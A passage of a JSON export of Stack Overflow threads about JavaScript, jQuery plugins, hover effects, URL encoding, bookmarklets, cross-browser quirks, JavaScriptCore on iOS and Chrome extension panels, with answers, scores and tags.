                    "score": 0
                },
                {
                    "body": "<h2>A simple template I created years ago and still works great:</h2>\n\n<pre><code>(function($) {\n    if (!$.myExample) { // check your plugin namespace does not already exist\n        $.extend({  //  this will allow you to add your plugin to the jQuery lib\n            myExample: function(elm, command, args) {\n                //  keep in mind, right here you might want to do a class or data check to determine which direction this call is going\n                //  for example, upon init the plugin on an element you may add the plugin name as a class, \n                //      this way, when it's recalled, you can see it alrady has that class and might be calling a command,\n                //          thus make an if statemnt to push the process through\n                return elm.each(function(index){\n                    // do work to each element as its passed through\n                    // be sure to use something like\n                    //    return elm.each(function(e) { dor work });\n                    // as your final statement in order to maintain \"chainability\"\n                });\n            }\n        });\n        $.fn.extend({   //  this gives the chainability functionality seen with $ funcs like: $(\"#eleID\").css(\"color\", \"red\") &lt;--returns original element object\n            myExample: function(command) {\n                return $.myExample($(this), command, Array.prototype.slice.call(arguments, 1));\n            }\n        });\n        $.myExample.props = {   //  Here you can establish specific properties to your plugin, prehaps even make them \"Over-writable\"\n            key1: \"value\",\n            key2: \"value\"\n        };\n        $.myExample.methods = { //  Here you can establish specific methods/functions for your plguin to carry out and maintain your namespace as well\n            key1: function(param) {\n                /*  do work */\n            },\n            key2: function(param) {\n                /*  do work */\n            }\n        };\n        //  This next part is not seen in many plugins but useful depending on what you're creating\n        $.myExample.init = function(param) {    //  If you have an initialize method to apply, namespace it in here and calll on initializing your plugin\n            var key = \"value\",\n                key2 = {\n                    subKey: \"value\"\n                };\n                /*\n                /  run any number of initializing functions here\n                /  I prefer to make my param a value that can be a\n                /   string with a possible object\n                /   the string for holding a base configuration\n                /   the object for any change in properties or base values for that config\n                */\n        };\n        $.myExample.defaults = {    //  establish base properties here that can be over-written via .props, but their values should never truly change\n            key1: \"value\",\n            key2: {\n                prop1: {\n                    subKey1: \"value\",\n                    subKey2: \"value\"\n                },\n                prop2: {\n                    subKey1: \"value\"\n                }\n            },\n            key3: function(param) {\n\n            }\n        };\n    }\n})(jQuery);\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
            "body": "<p>I wanted to create simple plugin using jquery.\nAlso suggest me standard practice while writing jQuery plugin.</p>\n\n<p>Please folks suggest me some better pointers.</p>\n",
            "last_activity_date": 1407064805,
            "question_id": 3958406,
            "score": 6,
            "tags": [
                "javascript",
                "jquery",
                "jquery-plugins"
            ],
            "title": "How to write a simple jQuery plugin"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>Are you looking for something like this:</p>\n\n<p><strong>jQuery:</strong></p>\n\n<pre><code>&lt;script type=\"text/javascript\"&gt;\n  $(document).ready(function(){\n    $(\"#images span &gt; img\").hover(function(){\n      $(this).fadeTo(\"fast\",0.3);\n    },function(){\n      $(this).fadeTo(\"fast\",1.0);\n    });\n  });\n&lt;/script&gt;\n</code></pre>\n\n<p><strong>HTML:</strong></p>\n\n<pre><code>&lt;div id=\"images\"&gt;\n  &lt;span&gt;&lt;img src=\"image1.jpg\" /&gt;&lt;/span&gt;\n  &lt;span&gt;&lt;img src=\"image2.jpg\" /&gt;&lt;/span&gt;\n  &lt;span&gt;&lt;img src=\"image3.jpg\" /&gt;&lt;/span&gt;\n  &lt;span&gt;&lt;img src=\"image4.jpg\" /&gt;&lt;/span&gt;\n  &lt;span&gt;&lt;img src=\"image5.jpg\" /&gt;&lt;/span&gt;\n  &lt;span&gt;&lt;img src=\"image6.jpg\" /&gt;&lt;/span&gt;\n  &lt;span&gt;&lt;img src=\"image7.jpg\" /&gt;&lt;/span&gt;\n&lt;/div&gt;\n</code></pre>\n\n<p><strong>CSS:</strong></p>\n\n<pre><code>&lt;style type=\"text/css\"&gt;\n  #images span {\n    display: inline-block;\n    background-color: orange;\n  }\n&lt;/style&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>So let's start with slightly simpler HTML:</p>\n\n<pre><code>&lt;ul id=\"special\"&gt;\n    &lt;li&gt;&lt;a href=\"#\"&gt;&lt;img src=\"opensrs-2.png\" /&gt;&lt;/a&gt;&lt;/li&gt;\n    &lt;li&gt;&lt;a href=\"#\"&gt;&lt;img src=\"opensrs-1.png\" /&gt;&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n</code></pre>\n\n<p>Here's my solution:</p>\n\n<pre><code>&lt;style type=\"text/css\"&gt;\n#special a img { border: none;}\n&lt;/style&gt;\n&lt;script type=\"text/javascript\"&gt;\n$(document).ready(function() {\n\n    $('#special a').bind('mouseover', function(){\n        $(this).parent('li').css({position:'relative'});\n        var img = $(this).children('img');\n        $('&lt;div /&gt;').text(' ').css({\n            'height': img.height(),\n            'width': img.width(),\n            'background-color': 'orange',\n            'position': 'absolute',\n            'top': 0,\n            'left': 0,\n            'opacity': 0.5\n        }).bind('mouseout', function(){\n            $(this).remove();\n        }).insertAfter(this);\n    });\n\n});\n&lt;/script&gt;\n</code></pre>\n\n<p><strong>EDIT:</strong> With fast fade in, fade out:</p>\n\n<pre><code>$('#special a').bind('mouseover', function(){\n    $(this).parent('li').css({position:'relative'});\n    var img = $(this).children('img');\n    $('&lt;div /&gt;').text(' ').css({\n        'height': img.height(),\n        'width': img.width(),\n        'background-color': 'orange',\n        'position': 'absolute',\n        'top': 0,\n        'left': 0,\n        'opacity': 0.0\n    }).bind('mouseout', function(){\n        $(this).fadeOut('fast', function(){\n            $(this).remove();\n        });\n    }).insertAfter(this).animate({\n        'opacity': 0.5\n    }, 'fast');\n});\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 12
                },
                {
                    "body": "<p>Heres the whole thing </p>\n\n<pre><code>&lt;script type=\"text/javascript\"&gt;\n$(function(){\n        $(\"img\").hover(function(){\n                            $(this).fadeTo(\"slow\",0);   \n                            },\n                            function(){\n                            $(this).fadeTo(\"slow\",1);       \n                            });\n});\n&lt;/script&gt;\n&lt;style type=\"text/css\"&gt;\n#lookhere{\n    background-color:orange;\n    width:auto;\n}\n&lt;/style&gt;\nHeres the html\n&lt;div id=\"lookhere\"&gt;&lt;img href=\"you know what goes here\"&gt;&lt;/div&gt;\n</code></pre>\n\n<p>It works and looks pretty cool. Nice idea.</p>\n",
                    "is_accepted": false,
                    "score": 4
                }
            ],
            "body": "<p>I can't seem to find any examples of this having been done anywhere on the internet before but here is what I am going to attempt to do...I'm trying to go about the cleanest possible way of laying this out.</p>\n\n<p>So I have an image gallery where the images are all different sizes. I want to make it so that when you mouseover the image, it turns a shade of orange.  Just a simple hover effect.</p>\n\n<p>I want to do this without using an image swap, otherwise I'd have to create an orange colored hover-image for each individual gallery image, I'd like this to be a bit more dynamic.</p>\n\n<p>My plan is just to position an empty div over the image absolutely with a background color, width and height 100% and opacity: 0.  Then using jquery, on mouseover I'd have the opacity fade to 0.3 or so, and fade back to zero on mouseout.</p>\n\n<p>My question is, what would be the best way to layout the html and css to do this efficiently and cleanly.</p>\n\n<p>Here's a brief, but incomplete setup:</p>\n\n<pre><code>&lt;li&gt;\n  &lt;a href=\"#\"&gt;\n    &lt;div class=\"hover\"&gt;&amp;nbsp;&lt;/div&gt;\n    &lt;img src=\"images/galerry_image.png\" /&gt;\n  &lt;/a&gt;\n&lt;/li&gt;\n\n.hover {\nwidth: 100%;\nheight: 100%;\nbackground: orange;\nopacity: 0;\n}\n</code></pre>\n",
            "last_activity_date": 1276430038,
            "question_id": 3030988,
            "score": 6,
            "tags": [
                "javascript",
                "jquery",
                "html",
                "css",
                "hover"
            ],
            "title": "jQuery image hover color overlay"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>Use </p>\n\n<pre><code>URI.escape(foo, Regexp.new(\"[^#{URI::PATTERN::UNRESERVED}]\"))\n</code></pre>\n\n<p>in ruby, and</p>\n\n<pre><code>encodeURIComponent(foo); \n</code></pre>\n\n<p>in javascript</p>\n\n<p>Both these will behave equally and encode space as %20.</p>\n",
                    "is_accepted": true,
                    "score": 14
                },
                {
                    "body": "<p>In URL encoding, both <code>+</code> and <code>%20</code> represent a space, so even though one may encode the space into a <code>+</code> and the other into a <code>%20</code>, they should both happily decode either back into a space.</p>\n\n<p>Javascript has a couple of different functions for encoding things for transmission; the best one to use is <code>encodeURIComponent</code>, which encodes each component of a URI. Like so:</p>\n\n<pre><code>var name = /* ...get the name from somewhere, perhaps a form field... */;\nvar queryString = \"?name=\" + encodeURIComponent(name);\n</code></pre>\n\n<p>This is better than the previous <code>encodeURI</code> function (and several people mistakenly think that <code>escape</code> does this, but it doesn't; it does something else entirely which is of fairly limited use).</p>\n",
                    "is_accepted": false,
                    "score": 3
                }
            ],
            "body": "<p>I am working on a web application where I have to encode and decode a string at the JavaScript side and Ruby backend of the code. the only problem is that the escape methods for JavaScript and Ruby have a small difference. in JavaScript the <code>\" \"</code> is treated as <code>\"%20\"</code> but in ruby the <code>\" \"</code> is encoded to <code>\"+\"</code>.</p>\n\n<p>Any way to solve this? Another Ruby method to encode a string in raw URL encode?</p>\n\n<p>After some Selenium testing I noticed that for some reason the <code>URI.unescape</code> mixes up between the <code>\"\u00a3\"</code> and the <code>\"?\"</code>. If I use <code>encodeURIComponent(\"\u00a3\");</code> in JavaScript and then <code>URI.unescape(\"%C2%A3\")</code> in Ruby which is the value we get when we encode the <code>\"\u00a3\"</code> sign, I get the <code>\"?\"</code> sign returned. Any solution?</p>\n",
            "last_activity_date": 1274191404,
            "question_id": 2834034,
            "score": 6,
            "tags": [
                "javascript",
                "ruby",
                "encoding"
            ],
            "title": "How do I raw URL encode/decode in JavaScript and Ruby to get the same values in both?"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>use the firebug console to develop and test your function, and turn it into a bookmarklet once you've got it working like you want to.</p>\n",
                    "is_accepted": true,
                    "score": 9
                },
                {
                    "body": "<p>These days I prefer to edit a file on my webserver, then load that using a bookmarklet.  For example:</p>\n\n<pre class=\"lang-js prettyprint-override\"><code>javascript:(function(){\n    var newScript = document.createElement('script');\n    newScript.src = 'http://hwi.ath.cx/javascript/wordcloud.js?dummy='\n                     + Math.random();\n    document.body.appendChild(newScript);\n})();\n</code></pre>\n\n<p>The random parameter is useful for a script under development, to ensure the browser won't load an older version from its cache.</p>\n\n<p>I find development with a text editor far preferable to the console, because I can take advantage of syntax highlighting, shortcut keys, and &mdash; you know &mdash; newlines.</p>\n",
                    "is_accepted": false,
                    "score": 15
                }
            ],
            "body": "<p>Here's how I make develop a bookmarklet: I write a javascript function, pass that to Bookmarklet Builder to make a bookmarklet, add the bookmarklet to my browser, load my test webpage, test the bookmarklet, and then something doesn't work, so I try to find what's wrong and change my javascript function accordingly and the tedious cycle starts again.</p>\n\n<p>How can I make this cycle less tedious?</p>\n",
            "last_activity_date": 1326546599,
            "question_id": 1810885,
            "score": 6,
            "tags": [
                "javascript",
                "bookmarklet"
            ],
            "title": "easier bookmarklet development"
        },
        {
            "answer_count": 10,
            "answers": [
                {
                    "body": "<p>With HTML markup like</p>\n\n<pre><code>&lt;div id=\"foo\"&gt;\n    &lt;a href=\"#\"&gt;Link 1&lt;/a&gt;\n&lt;/div&gt;\n</code></pre>\n\n<p>If you obtain a reference to the outer div, it will have one child node in some browsers, and three child nodes in others, depending on how whitespace is treated. Some will have text nodes with the newline and whitespace as children of <code>div#foo</code> before and after the link element.</p>\n",
                    "is_accepted": false,
                    "score": 7
                },
                {
                    "body": "<p>There are almost no inconsistencies in JavaScript implementations across browsers. If there were, it would be a nightmare multiplied (by the multiple inconsistencies in DOM implementation). So \"Top Ten Javascript Incompatibilities/Inconsistencies\" can probably only be populated with \"Bottom One\" you spotted. Indeed there could be a pair more, but I would hardly expect them to be major or even worth attention.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>DOM API inconsitencies aside (which is what libraries solve), there aren't many.</p>\n\n<p>But some JS engines have implemented <a href=\"https://developer.mozilla.org/en/New%5Fin%5FJavaScript%5F1.8\" rel=\"nofollow\">more features</a>, like [].map(), [].filter() etc, let statement or E4X. When I switch between Mozilla-targeted development (Firefox extensions, server-side with Jaxer) and general browser tageted development (websites) I need to remember what's available in every browser, and what isn't. So it's all about <strong>what</strong> is implemented, not <strong>how</strong> it is done.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Well, there's a problem with implied semicolons.</p>\n\n<pre><code>return {\n    a: 1,\n    b: 2\n}\n</code></pre>\n\n<p>Some people like opening brackets on its own line, like this:</p>\n\n<pre><code>return\n{\n    a: 1,\n    b: 2\n}\n</code></pre>\n\n<p>However, this last statement will return <code>undefined</code>, since the parser sees:</p>\n\n<pre><code>return;\n{\n    a: 1,\n    b: 2\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 6
                },
                {
                    "body": "<p>var x = new Boolean(false); if (x) ... else...;</p>\n\n<p>Is the 'if' or 'else' branch taken?</p>\n\n<p>var x = \"hi\", y = new String(\"hi\");</p>\n\n<p>what is the typeof(x) and typeof(y) ?</p>\n\n<p>Edit:..</p>\n\n<p>parseInt(\"017\") produces 15 (octal) instead of 17</p>\n\n<p>The 'Error' object is a different signature from IE to Firefox.</p>\n\n<p>When using objects as hashmap's, you need to use object.hasOwnProperty(key) to ensure that the property is not inherited through the prototype chain.</p>\n",
                    "is_accepted": true,
                    "score": 3
                },
                {
                    "body": "<p>Another one (don't think this comes up very often):</p>\n\n<pre><code>(typeof document.getElementById)\n</code></pre>\n\n<p>in IE: \"object\"</p>\n\n<p>in Firefox: \"function\"</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>Yet another one:</p>\n\n<p>Regular expressions from Firefox to IE, there are lots of inconsistencies:</p>\n\n<p>For the description:\n<a href=\"http://stevenlevithan.com/demo/split.cfm\" rel=\"nofollow\">http://blog.stevenlevithan.com/archives/cross-browser-split</a></p>\n\n<p>He publishes a fixed version of the RegEx object, and a testing page:\n<a href=\"http://stevenlevithan.com/demo/split.cfm\" rel=\"nofollow\">http://stevenlevithan.com/demo/split.cfm</a></p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>For the Date object:</p>\n\n<pre><code>alert( (new Date()).getYear();\n</code></pre>\n\n<p>Firefox returns 109</p>\n\n<p>Internet Explorer returns 2009</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<pre><code>alert(document instanceof Document)\n</code></pre>\n\n<p>in Firefox: true!</p>\n\n<p>in Internet Explorer: exception: Document is undefined</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>An extension to altCognito's point.. Element isn't a defined base type either...</p>\n\n<pre><code>//uses jQuery\nfunction getSomething(input) {\n   if (typeof(input) == string)\n       input = $(input)[0] || $('#'+input)[0] || null;\n\n   if (input instanceof Element)\n       input = $(input);\n\n   if (input instanceOf jQuery) {\n       ...do something...\n   }\n}\n</code></pre>\n\n<p>I had to replace the instanceOf Element with..</p>\n\n<pre><code>if (input &amp;&amp; input.tagName)...\n</code></pre>\n\n<p>Would be nice if DOM elements were properly base classed in IE all around.</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I'm looking to do a presentation in a couple of weeks and was wondering: What are the top ten Javascript incompatibilities that you look out for when developing? What trips you up? I can start with one:</p>\n\n<pre><code>var somevar = {\n 'internet': 'explorer',\n 'hates': 'trailing',\n 'commas': 'in',\n 'json': 'code', // oh noes!\n}\n</code></pre>\n\n<p>What are some other common gotchas that can't or aren't fixed by using a framework like jQuery or base? </p>\n",
            "last_activity_date": 1238608094,
            "question_id": 703993,
            "score": 6,
            "tags": [
                "javascript"
            ],
            "title": "Javascript Incompatibilities/Inconsistencies"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>The Objective-C interface in the JavascriptCore framework introduced with iOS 7 permits calling Objective-C methods from Javascript.  For a great intro to these features, check out the 2013 WWDC introduction \"Integrating JavaScript into Native Apps\" session on Apple's developer network: <a href=\"https://developer.apple.com/videos/wwdc/2013/?id=615\">https://developer.apple.com/videos/wwdc/2013/?id=615</a></p>\n\n<p>It does have a brief section towards the end on WebView (MacOs only not iOS) </p>\n\n<p>The sample code below shows how to implement what you want for iOS.</p>\n\n<pre><code>- (void)viewDidLoad\n{\n    [super viewDidLoad];\n\n    UIWebView *webView = [[UIWebView alloc] initWithFrame:CGRectMake(0,40,320,320)];\n    webView.delegate = self;\n    [self.view addSubview:webView];\n     NSString *pageSource = @\"&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;My Mobile App&lt;/h1&gt; &lt;p&gt;Please enter the Details&lt;/p&gt; &lt;form name=\\\"feedback\\\" method=\\\"post\\\" action=\\\"mailto:you@site.com\\\"&gt; &lt;!-- Form elements will go in here --&gt; &lt;/form&gt; &lt;form name=\\\"inputform\\\"&gt; &lt;input type=\\\"button\\\" onClick=\\\"submitButton('My Test Parameter')\\\" value=\\\"submit\\\"&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt;\";\n    [webView loadHTMLString:pageSource baseURL:nil];\n}\n\n- (void)webViewDidFinishLoad:(UIWebView *)webView\n{\n    JSContext *context =  [webView valueForKeyPath:@\"documentView.webView.mainFrame.javaScriptContext\"]; // Undocumented access\n    context[@\"submitButton\"] = ^(NSString *param1) {\n        [self yourObjectiveCMethod:param1];\n    };\n}\n\n- (void)yourObjectiveCMethod:(NSString *)param1 {\n    NSLog(@\"User clicked submit. param1=%@\", param1);\n}\n</code></pre>\n\n<p>Things to note:</p>\n\n<ul>\n<li>Accessing the JSContext of a UIWebView is undocumented.  Two techniques are known (see <a href=\"http://stackoverflow.com/questions/19664206/access-the-javascriptcore-engine-of-a-uiwebview\">Access the JavaScriptCore engine of a UIWebView</a>).  The first technique is used here. </li>\n<li>You don't need to define the javascript function \"submitButton\" inside the page, you will define the function from Objective-C using the webView's JSContext</li>\n<li>A page load in a webview causes its JSContext to get replaced, hence you should implement a delegate for the UIWebView and  define your Objective-C callback in your implementation of the selector for -webViewDidFinishLoad:</li>\n<li>I've assumed you will want to pass parameters to this callback, so I've shown a sample parameter.    Although this is not covered in the video tutorial mentioned above (or the PDF equivalent), looking at JSValue.h shows that JavascriptCore offers built-in conversion between the following Objective-C and Javascript types:</li>\n</ul>\n\n<p>.</p>\n\n<pre><code>  Objective-C type  |   JavaScript type\n--------------------+---------------------\n        nil         |     undefined\n       NSNull       |        null\n      NSString      |       string\n      NSNumber      |   number, boolean\n    NSDictionary    |   Object object\n      NSArray       |    Array object\n       NSDate       |     Date object\n      NSBlock *     |   Function object *\n         id **      |   Wrapper object **\n       Class ***    | Constructor object ***\n\n* Instances of NSBlock with supported arguments types will be presented to\nJavaScript as a callable Function object. For more information on supported\nargument types see JSExport.h. If a JavaScript Function originating from an\nObjective-C block is converted back to an Objective-C object the block will\nbe returned. All other JavaScript functions will be converted in the same\nmanner as a JavaScript object of type Object.\n\n** For Objective-C instances that do not derive from the set of types listed\nabove, a wrapper object to provide a retaining handle to the Objective-C\ninstance from JavaScript. For more information on these wrapper objects, see\nJSExport.h. When a JavaScript wrapper object is converted back to Objective-C\nthe Objective-C instance being retained by the wrapper is returned.\n\n*** For Objective-C Class objects a constructor object containing exported\nclass methods will be returned. See JSExport.h for more information on\nconstructor objects.\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 10
                }
            ],
            "body": "<p>I am loading a url in the webview which has below HTML and javascript function call. Now I am looking into when user touches submit button in webview it should call any method in viewController. Webview should load url(webview delegate) is one approach but is there any new way to get know when javascript function is called by webview should inform viewcontroller or trigger any method in view controller.</p>\n\n<p>I am not looking for this solution this we need to \n  - (BOOL)webView:(UIWebView *)webView shouldStartLoadWithRequest:(NSURLRequest *)request navigationType:(UIWebViewNavigationType)navigationType{</p>\n\n<pre><code>    NSLog(@\"passed data from web view : %@\",[[request URL] query]);\n\n    if([[[request URL] query] isEqualToString:@\"clickedOnLineNo\"])\n    {\n//Do your action here\n\n    }\n</code></pre>\n\n<p>We have to navigate to a fake URL from your javascript method like,</p>\n\n<p>window.location = \"someLink://yourApp/form_Submitted:param1:param2:param3\";\non a button click or your required action.</p>\n\n<p>But is there any new possibility from JavaScriptCore to achieve the same.</p>\n",
            "last_activity_date": 1396833585,
            "question_id": 21626137,
            "score": 5,
            "tags": [
                "javascript",
                "ios",
                "objective-c",
                "ios7",
                "javascriptcore"
            ],
            "title": "How to trigger objective C method from javascript using JavaScriptCore in iOS 7 in ViewControllers"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>I found how GTalk is the only extension with panels. You can have panels too in your own extension, using really dark magic:</p>\n\n<p>In your manifest.json, add the key-value pair: </p>\n\n<pre><code>\"key\": \"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDsDApubb73tPfYlNIFxDu3K3/EHgV6/YOJXJkld1OZ20jW/cOht1j0NggnXhQYuu1mXFUufud4I2N7b5ydyg09gcM9Va3Zk17RhNV9smbPHOd4XlzJeXifX/9MgHPu4FzCen3CiSXsOeAELJIXEuT28xICriuUko/rNPwGeIB9VwIDAQAB\"\n</code></pre>\n\n<p>And BOOM, panels activated! </p>\n\n<p>This is Google's way of activating a hidden feature. <a href=\"http://code.google.com/chrome/extensions/manifest.html#key\">The documentation tells us</a> \"key\"'s purpose is to provide a unique identifier <em>but that we don't really need it</em>. As demonstrated, it also activates hidden features. </p>\n\n<p>Also, you cannot have two extensions with the same \"key\" value (GTalk gets uninstalled). And I think your extension might not make it to the chrome store.</p>\n\n<p>If you know someone at Google, please tell them we mortals would really really love to have panels too. Panels are awesome. And they are the only way to display information on top of a web page while still interacting with it. Google should share the love, we really need panels.</p>\n",
                    "is_accepted": false,
                    "score": 8
                }
            ],
            "body": "<p>I need to have panel behavior in chrome: something always on top but that does not impair the navigation (in any other way than masking a few pixels).</p>\n\n<p>We have two options at the moment:</p>\n\n<ul>\n<li><p>window in panel mode: not available yet (although it is available now to the <a href=\"https://chrome.google.com/webstore/detail/nckgahadagoaajjgafhacjanaoiihapd\">GTalk extension</a>).</p></li>\n<li><p>window in popup mode: I can make it be always on top by refocusing at every event, however the focus will get targeted at my window (and impair the navigation)</p></li>\n</ul>\n\n<p>I'm looking for either:</p>\n\n<ul>\n<li><p>GTalk's dark magic</p></li>\n<li><p>A way to make a popup window stay on top (or come on top and relinquish the focus to the second topmost window)</p></li>\n</ul>\n",
            "last_activity_date": 1342440723,
            "question_id": 9778098,
            "score": 5,
            "tags": [
                "javascript",
                "google-chrome",
                "google-chrome-extension",
                "panel"
            ],
            "title": "Having panel behavior in chrome extension"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>I had a few sites bookmarked on this very topic, hopefully they will help you out with what you need. (Topics range from simple to advanced)</p>\n\n<p><a href=\"http://www.artzstudio.com/2009/04/jquery-performance-rules/\">jQuery Performance Rules</a> topics include :</p>\n\n<blockquote>\n  <ol>\n  <li>Always Descend From an #id</li>\n  <li>Use Tags Before Classes</li>\n  <li>Cache jQuery Objects</li>\n  <li>Harness the Power of Chaining</li>\n  <li>Use Sub-queries</li>\n  <li>Limit Direct DOM Manipulation</li>\n  <li>Leverage Event Delegation (a.k.a. Bubbling)</li>\n  <li>Eliminate Query Waste</li>\n  <li>Defer to $(window).load</li>\n  <li>Compress Your JS</li>\n  <li>Learn the Library</li>\n  </ol>\n</blockquote>\n\n<p><a href=\"http://addyosmani.com/blog/8-jquery-performance-tips/\">jQuery Performance and Optimization Tips</a> topics include :</p>\n\n<blockquote>\n  <ol>\n  <li>Stay up to date! Are you using methods and techniques that are obsolete?.</li>\n  <li>Context-aware jQuery Code Execution \u2013 Are you loading code that isn\u2019t needed?</li>\n  <li>jQuery Unit Testing</li>\n  <li>Benchmark Your jQuery Code</li>\n  <li>Keep download times to a minimum with one compressed master JS file.</li>\n  <li>Context Vs. Find</li>\n  <li>Window.load all the way.</li>\n  <li>Strike A Balance Between Your Use Of JavaScript &amp; jQuery</li>\n  </ol>\n</blockquote>\n\n<p><a href=\"http://jonraasch.com/blog/10-advanced-jquery-performance-tuning-tips-from-paul-irish\">jQuery Performance Tuning Tips - Paul Irish</a> topics include :</p>\n\n<blockquote>\n  <ol>\n  <li>Optimize selectors for Sizzle\u2019s \u2018right to left\u2019 model</li>\n  <li>Use live() not click()</li>\n  <li>Pull elements off of the DOM while you play with them</li>\n  <li>Use find() rather than context</li>\n  <li>Use HTML 5</li>\n  <li>Append style tags when styling 15 or more elements</li>\n  <li>Test selectors using Google Page Speed</li>\n  <li>Use object detection even if jQuery doesn't throw an error</li>\n  <li>Use direct functions rather than their convenience counterparts</li>\n  <li>Learn the lesser known methods</li>\n  </ol>\n</blockquote>\n\n<p><a href=\"http://jquery-howto.blogspot.com/2009/02/5-easy-tips-on-how-to-improve-code.html\">Improving jQuery Performance with Large Data Sets</a> topics include :</p>\n\n<blockquote>\n  <ol>\n  <li>Use JavaScript native for() loop instead of jQuery's $.each() helper<br>\n  function. </li>\n  <li>Do NOT append an element to the DOM in your loop. </li>\n  <li>If you have a lot of elements to be inserted into the DOM, surround them<br>\n  with a parent element for better\n  performance. </li>\n  <li>Don't use string concatenation, instead use array's join() method for\n  a very    long strings. </li>\n  <li>Use setTimeout() function for your long list looping and concatenation<br>\n  functions.</li>\n  </ol>\n</blockquote>\n\n<p>Hopefully these will be enough to get you started on your journey to jQuery performance heaven.</p>\n",
                    "is_accepted": true,
                    "score": 18
                }
            ],
            "body": "<p>I just started working with jQuery and I have been searching for some type of resource on how to improve the speed/performance of my code. I was wondering if anyone had any tips or resources that could possibly help me out.</p>\n\n<p>Thanks,</p>\n\n<p>Bev</p>\n",
            "last_activity_date": 1295102734,
            "question_id": 4700097,
            "score": 5,
            "tags": [
                "javascript",
                "jquery",
                "performance"
            ],
            "title": "jQuery - Improving Performance / Code"
        }
    ]
}
